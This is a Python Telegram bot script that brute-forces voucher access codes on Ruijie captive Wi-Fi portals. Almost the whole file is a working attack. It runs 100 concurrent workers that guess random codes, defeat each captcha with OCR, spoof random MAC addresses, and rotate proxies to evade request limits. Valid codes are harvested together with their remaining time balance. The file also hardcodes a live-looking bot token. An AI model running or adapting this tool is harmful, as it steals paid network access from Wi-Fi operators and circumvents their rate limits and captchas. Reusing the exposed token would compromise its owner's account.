# -*- coding: utf-8 -*-
# =====================================================================================
#  sirzipp.py — FINAL VERSION
#  Auto Domain Detection + Fast Scan + Proxy + Dashboard
# =====================================================================================

import os
import sys
import re
import json
import time
import random
import string
import asyncio
import datetime

import aiohttp
import ddddocr

from urllib.parse import parse_qs, urljoin, urlparse

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (Application, CallbackQueryHandler, CommandHandler,
                          MessageHandler, filters)

# ── CONFIGURATION ────────────────────────────────────────────────────────────

BOT_TOKEN = "8810710930:AAFf_yQc4WBJlVk9nk9yDQuJsqfyjCGOVL8"

PORTAL_URL_PATH = "portal_url_"
PROXY_FILE = "proxies.txt"
MAX_CODES_PER_SESSION = 999999999
MAX_CODES_PER_SID = 30
NUM_WORKERS = 100
TIMEOUT_SEC = 15

ADMIN_IDS = [6537847588]

# ── DEFAULT API URLs (Portal URL မှာ domain မပါရင် သုံးမယ်) ──
DEFAULT_DOMAIN = "portal-as.ruijienetworks.com"

user_scanners = {}
_ocr_instance = None
bot = None

# ── PROXY MANAGER ────────────────────────────────────────────────────────────

PROXY_LIST = []
_proxy_index = 0


def load_proxies():
    global PROXY_LIST
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r") as f:
            lines = [l.strip() for l in f if l.strip()]
        PROXY_LIST = lines
        print(f"[PROXY] Loaded {len(PROXY_LIST)} proxies")
    else:
        PROXY_LIST = []
        print("[PROXY] No proxies.txt file")


def save_proxies(proxy_text):
    global PROXY_LIST
    lines = [l.strip() for l in proxy_text.split("\n") if l.strip()]
    with open(PROXY_FILE, "w") as f:
        f.write("\n".join(lines))
    PROXY_LIST = lines
    print(f"[PROXY] Saved {len(PROXY_LIST)} proxies")


def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return proxy


def get_api_urls(portal_url):
    """Portal URL ထဲက domain ကို ဖတ်ပြီး API URLs တွေ ဖန်တီးပါ"""
    try:
        parsed = urlparse(portal_url)
        domain = parsed.netloc
        if domain:
            print(f"[API] Using domain: {domain}")
            return {
                "login": f"https://{domain}/api/auth/voucher/?lang=en_US",
                "captcha": f"https://{domain}/api/auth/captcha/image",
                "verify": f"https://{domain}/api/auth/captcha/verify",
                "balance": f"https://{domain}/api/auth/balance/getBalance/",
            }
    except Exception as e:
        print(f"[API] Error parsing portal URL: {e}")
    print(f"[API] Using default domain: {DEFAULT_DOMAIN}")
    return {
        "login": f"https://{DEFAULT_DOMAIN}/api/auth/voucher/?lang=en_US",
        "captcha": f"https://{DEFAULT_DOMAIN}/api/auth/captcha/image",
        "verify": f"https://{DEFAULT_DOMAIN}/api/auth/captcha/verify",
        "balance": f"https://{DEFAULT_DOMAIN}/api/auth/balance/getBalance/",
    }


# ── BANNER ───────────────────────────────────────────────────────────────────

def show_banner():
    os.system("clear" if os.name == "posix" else "cls")
    print("=" * 55)
    print("   ⚡ RUIJIE ASYNC EXTREME ⚡   ")
    print("        Telegram@sayarkn     ")
    print("=" * 55)


# ── OCR ──────────────────────────────────────────────────────────────────────

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


# ── USER DATA ────────────────────────────────────────────────────────────────

def get_user_data(user_id):
    if user_id not in user_scanners:
        saved_url = None
        p_file = PORTAL_URL_PATH + str(user_id) + ".txt"
        if os.path.exists(p_file):
            with open(p_file, "r") as f:
                saved_url = f.read().strip()
        user_scanners[user_id] = {
            "mode": "num6",
            "char_set": "012345678",
            "code_len": 6,
            "start_digit": None,
            "portal_url": saved_url,
            "stop_event": asyncio.Event(),
            "task": None,
            "stats": {
                "tried": 0, "hits": 0, "expired": 0, "limits": 0,
                "start_time": time.time(),
                "valid_codes": [], "limit_codes": [], "tried_codes": set(),
                "recent_logs": [], "recheck_queue": [],
            },
            "CURRENT_CODE": "----",
            "dash_msg_id": None,
            "menu_msg_id": None,
            "state": {},
        }
    return user_scanners[user_id]


# ── MAC GENERATOR ────────────────────────────────────────────────────────────

def generate_random_mac():
    return ":".join("%02x" % random.randint(0, 255) for _ in range(6))


# ── OCR WRAPPER ──────────────────────────────────────────────────────────────

def ocr_image_bytes_fast(image_bytes):
    ocr = get_ocr_instance()
    result = ocr.classification(image_bytes).strip().upper()
    return result


# ── CAPTCHA ──────────────────────────────────────────────────────────────────

async def solve_captcha_simple_async(session, captcha_url, headers, proxy=None):
    current_url = captcha_url + "?sessionId=" if "?" not in captcha_url else captcha_url + "&_t=" + str(time.time())
    response = await session.get(current_url, headers=headers, ssl=False, proxy=proxy)
    image_content = await response.read()
    return await asyncio.to_thread(ocr_image_bytes_fast, image_content)


# ── SID (Auto-Detect) ────────────────────────────────────────────────────────

async def get_sid_from_gateway(session, portal_url, user_id, proxy=None):
    ud = get_user_data(user_id)
    if ud["stop_event"].is_set():
        return None
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    mac = generate_random_mac()
    portal_url = re.sub(r'(?<=mac=)[^&]+', mac, portal_url)

    try:
        parsed_orig = parse_qs(urlparse(portal_url).query)
        sid_orig = parsed_orig.get("sid") or parsed_orig.get("sessionId")
        if sid_orig:
            return sid_orig[0]
    except Exception:
        pass

    body1 = ""
    final_url1 = portal_url
    try:
        r1 = await session.get(portal_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False,
                               allow_redirects=True, proxy=proxy)
        body1 = await r1.text()
        final_url1 = str(r1.url)
    except Exception:
        return None

    if ud["stop_event"].is_set():
        return None

    try:
        parsed = parse_qs(urlparse(final_url1).query)
        sid_list = parsed.get("sid") or parsed.get("sessionId")
        if sid_list:
            return sid_list[0]
    except Exception:
        pass

    for pattern in [r'sid["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'sessionId["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']']:
        m = re.search(pattern, body1)
        if m:
            return m.group(1)

    return None


# ── BALANCE ──────────────────────────────────────────────────────────────────

async def fetch_balance(balance_url, active_token, code, retries=3, proxy=None):
    url = balance_url + active_token + "?lang=en_US"
    headers = {
        "authority": urlparse(balance_url).netloc,
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;",
        "referer": "https://" + urlparse(balance_url).netloc + "/download/static/maccauth/src/balance.html?sessionId=" + active_token,
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    for attempt in range(retries):
        try:
            async with aiohttp.ClientSession() as s:
                resp = await s.get(url, headers=headers, timeout=TIMEOUT_SEC, ssl=False, proxy=proxy)
                raw_text = await resp.text()
                try:
                    data = json.loads(raw_text)
                except Exception:
                    return "N/A"
                if not isinstance(data, dict):
                    return "N/A"
                if resp.status != 200:
                    return "N/A"
                if data.get("success") is False:
                    msg = data.get("message", "Unknown")
                    if "timed out" in msg.lower() and attempt < retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return "N/A"
                profile_name = data.get("profileName", None)
                raw_total = data.get("totalMinutes", None)
                if raw_total is None:
                    raw_total = data.get("remainingMinutes", None)
                if profile_name is None and "result" in data:
                    result = data.get("result", {})
                    profile_name = result.get("profileName", "N/A")
                    raw_total = result.get("totalMinutes", None)
                    if raw_total is None:
                        raw_total = result.get("remainingMinutes", None)
                if profile_name is None:
                    profile_name = "N/A"
                if raw_total is not None:
                    total_minutes = int(raw_total)
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return "📵: " + profile_name + ", ⏰: " + str(hours) + " hr " + str(minutes) + " min"
                return "📵: " + profile_name + ", ⏰: N/A"
        except Exception as e:
            if attempt < retries - 1:
                await asyncio.sleep(0.5)
                continue
            return "N/A"
    return "N/A"


# ── CHECK SINGLE CODE ────────────────────────────────────────────────────────

async def check_single_access_code(session, code, current_session_id,
                                   api_urls, headers, user_id, proxy=None):
    ud = get_user_data(user_id)
    if ud["stop_event"].is_set():
        return
    login_url = api_urls["login"]
    captcha_base_url = api_urls["captcha"]
    verify_url = api_urls["verify"]
    balance_url = api_urls["balance"]
    captcha_url = captcha_base_url + "?sessionId=" + current_session_id + "&_t=" + str(time.time())
    retry_count = 0
    while True:
        if ud["stop_event"].is_set():
            return
        try:
            auth_code = await solve_captcha_simple_async(session, captcha_url, headers, proxy=proxy)
            v_payload = {"sessionId": current_session_id, "authCode": auth_code}
            v_resp = await session.post(verify_url, json=v_payload, headers=headers,
                                        ssl=False, timeout=TIMEOUT_SEC, proxy=proxy)
            v_data = await v_resp.json()
            l_payload = {
                "accessCode": code,
                "sessionId": current_session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            l_resp = await session.post(login_url, json=l_payload, headers=headers,
                                        ssl=False, timeout=TIMEOUT_SEC, proxy=proxy)
            l_text = await l_resp.text()
        except Exception:
            if proxy is not None:
                proxy = None
                continue
            return

        token_match = re.search(r"token[=:\"'\s]+([A-Za-z0-9_\-\.]+)", l_text)
        if token_match:
            active_token = token_match.group(1)
            ud["stats"]["tried"] += 1
            balance_str = await fetch_balance(balance_url, active_token, code, proxy=proxy)
            if not any(c["code"] == code for c in ud["stats"]["valid_codes"]):
                ud["stats"]["valid_codes"].append({
                    "code": code,
                    "balance_str": balance_str,
                })
            ud["stats"]["recent_logs"].append("✅ HIT: " + code + " | " + balance_str)
            print(f"[DEBUG] HIT! {code} | {balance_str}")
            return
        if "failed" in l_text:
            ud["stats"]["tried"] += 1
            return
        if "request limited" in l_text.lower():
            ud["stats"]["limits"] += 1
            ud["stats"]["recent_logs"].append("⚠️ LIMIT: " + code)
            return
        if "expired" in l_text:
            ud["stats"]["expired"] += 1
            return
        if "the number of sta exceeds the limit" in l_text:
            ud["stats"]["limit_codes"].append(code)
            return
        retry_count += 1
        if retry_count >= 2:
            return


# ── WORKER ───────────────────────────────────────────────────────────────────

async def worker(worker_id, api_urls, headers, user_id):
    ud = get_user_data(user_id)
    while not ud["stop_event"].is_set():
        proxy = get_next_proxy()

        async with aiohttp.ClientSession() as session:
            current_session_id = None
            codes_checked_this_sid = 0
            codes_checked_this_session = 0
            sid_failures = 0
            while not ud["stop_event"].is_set():
                if current_session_id is None or codes_checked_this_sid >= MAX_CODES_PER_SID:
                    if ud["stop_event"].is_set():
                        break
                    sid = await get_sid_from_gateway(session, ud["portal_url"], user_id, proxy=proxy)
                    if sid:
                        current_session_id = sid
                        codes_checked_this_sid = 0
                        sid_failures = 0
                    else:
                        sid_failures += 1
                        if sid_failures >= 20:
                            await asyncio.sleep(2)
                            sid_failures = 0
                            continue
                        await asyncio.sleep(0.5)
                        continue
                if ud["stop_event"].is_set():
                    break
                if ud["mode"] == "custom" and ud["start_digit"]:
                    body_chars = random.choices(ud["char_set"], k=ud["code_len"])
                    body_chars = [c if i > 0 else ud["start_digit"] for i, c in enumerate(body_chars)]
                    random.shuffle(body_chars)
                    code = ud["start_digit"] + "".join(body_chars[:ud["code_len"] - 1])
                else:
                    code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))
                if code in ud["stats"]["tried_codes"]:
                    continue
                ud["stats"]["tried_codes"].add(code)
                ud["CURRENT_CODE"] = code
                await check_single_access_code(session, code, current_session_id,
                                               api_urls, headers, user_id, proxy=proxy)
                codes_checked_this_sid += 1
                codes_checked_this_session += 1


# ── RUN SCANNER ──────────────────────────────────────────────────────────────

async def run_user_scanner(context, user_id):
    ud = get_user_data(user_id)
    ud["CURRENT_CODE"] = "----"
    try:
        ud["stats"] = {
            "tried": 0, "hits": 0, "expired": 0, "limits": 0,
            "start_time": time.time(),
            "valid_codes": [], "limit_codes": [], "tried_codes": set(),
            "recent_logs": [], "recheck_queue": [],
        }
        ud["stop_event"].clear()

        # ⭐ Portal URL ထဲက domain ကို ဖတ်ပြီး API URLs ဖန်တီး
        api_urls = get_api_urls(ud["portal_url"])

        msg = await context.bot.send_message(chat_id=user_id, text="⚡ Scanner Starting...")
        ud["dash_msg_id"] = msg.message_id

        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://" + urlparse(ud["portal_url"]).netloc,
            "Referer": "https://" + urlparse(ud["portal_url"]).netloc + "/download/static/maccauth/src/index.html",
        }
        worker_tasks = [
            asyncio.create_task(worker(i, api_urls, headers, user_id))
            for i in range(NUM_WORKERS)
        ]

        last_update = 0
        while not ud["stop_event"].is_set():
            if all(t.done() for t in worker_tasks):
                break

            if time.time() - last_update >= 5:
                last_update = time.time()
                stats = ud["stats"]
                elapsed = time.time() - stats["start_time"]
                speed_cpm = stats["tried"] / elapsed * 60 if elapsed > 0 else 0
                hit_list = [
                    {"code": c["code"], "balance": c.get("balance_str", "N/A")}
                    for c in stats["valid_codes"]
                ]
                hit_str = "None yet" if not hit_list else "\n".join(
                    "🔥 " + item["code"] + " " + item["balance"] for item in hit_list)
                last_log = stats["recent_logs"][-1] if stats["recent_logs"] else "None yet"
                proxy_count = len(PROXY_LIST)
                proxy_str = "Direct (No Proxy)" if proxy_count == 0 else str(proxy_count) + " proxies"
                current_code = ud.get("CURRENT_CODE", "----")
                text = ("⚡ Scanner Running ⚡\nThank for using By Telegram @sayarkn\n"
                        "━━━━━━━━━━━━━━━━━\n🏹 Tried: " + str(stats["tried"]) +
                        "\n🎯 Current Code: " + current_code +
                        "\n🔥 Hits: " + str(len(stats["valid_codes"])) +
                        "\n⚔️ Expired: " + str(stats["expired"]) +
                        "\n⚠️ Limits: " + str(stats["limits"]) +
                        "\n⚡ Speed: " + format(speed_cpm, ".1f") + " c/m"
                        "\n🔀 Proxies: " + proxy_str +
                        "\n━━━━━━━━━━━━━━━━━\n🔥 **Hit Codes**:\n" + hit_str +
                        "\n━━━━━━━━━━━━━━━━━\n🔥 Last: " + last_log)
                keyboard = [[InlineKeyboardButton("🛑 Stop", callback_data="stop_scan")]]
                try:
                    await asyncio.wait_for(
                        context.bot.edit_message_text(
                            chat_id=user_id, message_id=ud["dash_msg_id"],
                            text=text, reply_markup=InlineKeyboardMarkup(keyboard)),
                        timeout=30.0
                    )
                    print(f"[DASHBOARD] Updated: tried={stats['tried']}, hits={len(stats['valid_codes'])}")
                except asyncio.TimeoutError:
                    print(f"[DASHBOARD] Timeout: tried={stats['tried']}")
                except Exception as e:
                    err_str = str(e)
                    if "Message is not modified" in err_str:
                        pass
                    else:
                        print(f"[DASHBOARD ERROR] {err_str}")
            await asyncio.sleep(1)

        stats = ud["stats"]
        elapsed = time.time() - stats["start_time"]
        speed_cpm = stats["tried"] / elapsed * 60 if elapsed > 0 else 0
        hit_list = [
            {"code": c["code"], "balance": c.get("balance_str", "N/A")}
            for c in stats["valid_codes"]
        ]
        hit_str = "None yet" if not hit_list else "\n".join(
            "🔥 " + item["code"] + " " + item["balance"] for item in hit_list)
        final_text = ("🛑 Scanner Stopped/Finished\n━━━━━━━━━━━━━━━━━\n"
                      "🔎 Total Tried: " + str(stats["tried"]) +
                      "\n⚡ Final Speed: " + format(speed_cpm, ".1f") + " c/m"
                      "\n🟢 Hits: " + str(len(stats["valid_codes"])) +
                      "\n━━━━━━━━━━━━━━━━━\n📋 **All Hit Codes**:\n" + hit_str)
        try:
            await context.bot.edit_message_text(chat_id=user_id, message_id=ud["dash_msg_id"], text=final_text)
        except Exception:
            try:
                await context.bot.send_message(chat_id=user_id, text=final_text)
            except Exception:
                pass

    except asyncio.CancelledError:
        raise
    except Exception as exc:
        print(f"[RUN ERROR] {type(exc).__name__}: {exc}")
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text="❌ Dashboard စတင်ရာမှာ error တက်နေပါတယ်။\n\n"
                     f"Error: {type(exc).__name__}: {exc}")
        except Exception:
            pass


# ── MENU ─────────────────────────────────────────────────────────────────────

def get_main_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Update Portal", callback_data="btn_update_portal")],
        [InlineKeyboardButton("⚙️ Mode", callback_data="btn_mode_menu")],
        [InlineKeyboardButton("➕ Add Proxies", callback_data="btn_add_proxies")],
        [InlineKeyboardButton("🚀 Start Scanner", callback_data="btn_start_scanner")],
        [InlineKeyboardButton("🛑 Stop Scanner", callback_data="stop_scan")],
    ])


# ── ADMIN GATE ───────────────────────────────────────────────────────────────

def admin_only(func):
    async def wrapper(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.effective_message.reply_text(
                "⛔ သင် ဒီ Bot ကို အသုံးပြုခွင့်ရှိသူမဟုတ်ပါ။ အသုံးပြုလိုပါက telegram @sayarkn ဆီ မေးပါ")
            return
        return await func(update, context)
    return wrapper


# ── STOP COMMAND ─────────────────────────────────────────────────────────────

@admin_only
async def stop_scan_command(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    if ud["task"] and not ud["task"].done():
        ud["stop_event"].set()
        ud["task"].cancel()
        ud["task"] = None
        await update.effective_message.reply_text("🛑 Scan ရပ်ပြီးပါပြီ။")
    else:
        await update.effective_message.reply_text("ရပ်ရန် Scan မရှိပါ။")


# ── HANDLERS ─────────────────────────────────────────────────────────────────

@admin_only
async def start(update, context):
    ud = get_user_data(update.effective_user.id)
    proxy_count = len(PROXY_LIST)
    proxy_str = "Direct (No Proxy)" if proxy_count == 0 else str(proxy_count) + " proxies"
    text = ("⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            "⚙️ Current Mode: `" + ud["mode"] +
            "`\n🔀 Proxies: `" + proxy_str + "`")
    msg = await update.effective_message.reply_text(
        text, parse_mode=ParseMode.MARKDOWN, reply_markup=get_main_menu_markup())
    ud["menu_msg_id"] = msg.message_id


@admin_only
async def handle_callbacks(update, context):
    query = update.callback_query
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data
    try:
        await query.answer()
    except Exception as e:
        print(f"[QUERY ANSWER ERROR] {e}")

    if data == "btn_update_portal":
        ud["state"]["waiting_for_portal_url"] = True
        await query.edit_message_text("🌐 **Portal URL ကို ပေးပေးပါ**")

    elif data == "btn_add_proxies":
        ud["state"]["waiting_for_proxies"] = True
        await query.edit_message_text(
            "📥 **Proxy များကို ပေးပေးပါ**\n\n"
            "တစ်ကြောင်းတစ်ခု ထည့်ပါ:\n"
            "`http://user:pass@host:port`\n"
            "`socks5://host:port`\n"
            "`http://host:port`",
            parse_mode=ParseMode.MARKDOWN)

    elif data == "btn_mode_menu":
        await query.edit_message_text(
            "⚙️ **Choose Scanner Mode**",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Number 6", callback_data="set_mode_num6"),
                 InlineKeyboardButton("Number 7", callback_data="set_mode_num7"),
                 InlineKeyboardButton("Number 8", callback_data="set_mode_num8"),
                 InlineKeyboardButton("Number 9", callback_data="set_mode_num9")],
                [InlineKeyboardButton("ABC 6", callback_data="set_mode_abc6")],
                [InlineKeyboardButton("Mix 6", callback_data="set_mode_mix6"),
                 InlineKeyboardButton("Custom Start", callback_data="set_mode_custom")],
                [InlineKeyboardButton("⬅️ Back", callback_data="btn_back_main")],
            ]))

    elif data.startswith("set_mode_"):
        m = data.split("set_mode_")[1]
        if m == "num6":
            ud["mode"] = "num6"; ud["char_set"] = "012345678"; ud["code_len"] = 6
        elif m == "num7":
            ud["mode"] = "num7"; ud["char_set"] = "012345678"; ud["code_len"] = 7
        elif m == "num8":
            ud["mode"] = "num8"; ud["char_set"] = "012345678"; ud["code_len"] = 8
        elif m == "num9":
            ud["mode"] = "num9"; ud["char_set"] = "012345678"; ud["code_len"] = 9
        elif m == "abc6":
            ud["mode"] = "abc6"; ud["char_set"] = "abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 6
        elif m == "mix6":
            ud["mode"] = "mix6"; ud["char_set"] = "2345678abcdefghijkmnpqrstuvwxyz"; ud["code_len"] = 6
        elif m == "custom":
            ud["mode"] = "custom"; ud["char_set"] = "012345678"; ud["code_len"] = 6
            ud["state"]["waiting_for_digit"] = True
            await query.edit_message_text("🔢 **Start Digit**\nနံပါတ်တစ်လုံး ရိုက်ထည့်ပေးပါ")
            return
        panel = ("✅ `mode` ပြောင်းပြီးပါပြီ\n\n"
                 "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                 "⚙️ Current Mode: `" + ud["mode"] + "`")
        await query.edit_message_text(panel, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=get_main_menu_markup())

    elif data == "btn_start_scanner":
        if not ud["portal_url"]:
            await query.edit_message_text(
                "❌ Portal URL မရှိပါ၊ အရင် `Update Portal` နှိပ်ပေးပါ")
            return
        task = asyncio.create_task(run_user_scanner(context, user_id))
        ud["task"] = task

    elif data == "stop_scan":
        ud["stop_event"].set()
        if ud["task"]:
            ud["task"].cancel()
            ud["task"] = None
        try:
            await query.answer("🛑 Scan ရပ်ပြီးပါပြီ။", show_alert=True)
        except Exception:
            pass

    elif data == "btn_back_main":
        proxy_count = len(PROXY_LIST)
        proxy_str = "Direct (No Proxy)" if proxy_count == 0 else str(proxy_count) + " proxies"
        panel = ("⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                 "⚙️ Current Mode: `" + ud["mode"] +
                 "`\n🔀 Proxies: `" + proxy_str + "`")
        await query.edit_message_text(panel, parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=get_main_menu_markup())


@admin_only
async def handle_text(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    text = update.effective_message.text

    if ud["state"].get("waiting_for_portal_url"):
        ud["state"]["waiting_for_portal_url"] = False
        url = text.strip()
        if not url.startswith(("http://", "https://")):
            await update.effective_message.reply_text(
                "❌ အောက်ပါအတိုင်း http/https URL ပေးပါ")
            return
        ud["portal_url"] = url
        with open(PORTAL_URL_PATH + str(user_id) + ".txt", "w") as f:
            f.write(url)
        # ⭐ Portal URL ထဲက domain ကို ပြပါ
        api_urls = get_api_urls(url)
        domain = urlparse(url).netloc
        await update.effective_message.reply_text(
            "✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ\n\n"
            "🌐 Domain: `" + domain + "`\n"
            "🔗 Login URL: `" + api_urls["login"] + "`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu_markup())
        return

    if ud["state"].get("waiting_for_proxies"):
        ud["state"]["waiting_for_proxies"] = False
        save_proxies(text)
        await update.effective_message.reply_text(
            "✅ Proxies သိမ်းပြီးပါပြီ - " + str(len(PROXY_LIST)) + " proxies",
            reply_markup=get_main_menu_markup())
        return

    if ud["state"].get("waiting_for_digit"):
        ud["state"]["waiting_for_digit"] = False
        ud["start_digit"] = text.strip() or "0"
        await update.effective_message.reply_text(
            "✅ Custom Start Digit = `" + ud["start_digit"] + "`",
            parse_mode=ParseMode.MARKDOWN)
        return


# ── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    global bot
    print("[MAIN] FINAL MODE initialized")
    load_proxies()
    app = Application.builder().token(BOT_TOKEN).build()
    bot = app.bot
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_scan_command))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("Bot is running with python-telegram-bot...")
    print("Thank for using By Telegram@sayarkn")
    app.run_polling()


# module-level startup
show_banner()
main()